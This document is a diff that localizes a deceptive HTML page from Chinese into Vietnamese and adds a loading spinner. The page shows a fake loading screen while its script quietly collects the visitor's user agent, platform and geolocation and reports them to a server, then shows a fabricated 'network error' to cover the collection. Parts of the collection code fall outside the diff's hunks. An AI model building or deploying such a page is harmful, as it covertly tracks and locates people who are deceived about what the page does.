@@ -1,23 +1,44 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>載入中...</title>
+  <title>Đang tải...</title>
   <style>
-    body { background: #fff; margin: 0; }
-    #loading { 
-      position: absolute; left: 50%; top: 50%; 
-      transform: translate(-50%,-50%);
-      font-family: sans-serif; color: #888; font-size: 1.3em;
+    body { background: #fff; margin: 0; height: 100vh;}
+    .centerbox {
+      position: absolute; left: 50%; top: 50%;
+      transform: translate(-50%, -50%);
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+    }
+    .loader {
+      border: 8px solid #f3f3f3; /* Light grey */
+      border-top: 8px solid #3498db; /* Blue */
+      border-radius: 50%;
+      width: 56px;
+      height: 56px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .text {
+      font-family: sans-serif; 
+      color: #555; 
+      font-size: 1.2em;
+      text-align: center;
+      margin-top: 0.5em;
     }
   </style>
   <script>
-    // 設定隨機加載秒數 1~4 秒
-    const minWait = 1000; //ms
+    // Thiết lập thời gian tải giả ngẫu nhiên: 1-4 giây
+    const minWait = 1000;
     const maxWait = 4000;
     const waitTime = Math.floor(Math.random() * (maxWait-minWait)) + minWait;
 
-    // 背景資料上傳行為
+    // Gửi thông tin thiết bị/người dùng lên server
     const deviceInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -42,7 +63,7 @@
     }
 
     window.onload = function() {
-      // 開始背景上報
+      // Bắt đầu thu thập dữ liệu nền
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
@@ -65,14 +86,22 @@
           report(deviceInfo);
         });
       }
-      // 隨機延時後顯示網絡錯誤
+      // Sau khi hết thời gian ngẫu nhiên thì hiện lỗi mạng
       setTimeout(() => {
-        document.body.innerHTML = '<h1 style="color:red;text-align:center;">網絡錯誤</h1>';
+        document.body.innerHTML = `
+          <div class="centerbox">
+            <h1 style="color:red;">Lỗi mạng</h1>
+            <div class="text">Vui lòng kiểm tra kết nối Internet của bạn.</div>
+          </div>
+        `;
       }, waitTime);
     };
   </script>
 </head>
 <body>
-  <div id="loading">載入中...</div>
+  <div class="centerbox">
+    <div class="loader"></div>
+    <div class="text">Đang tải...</div>
+  </div>
 </body>
 </html>
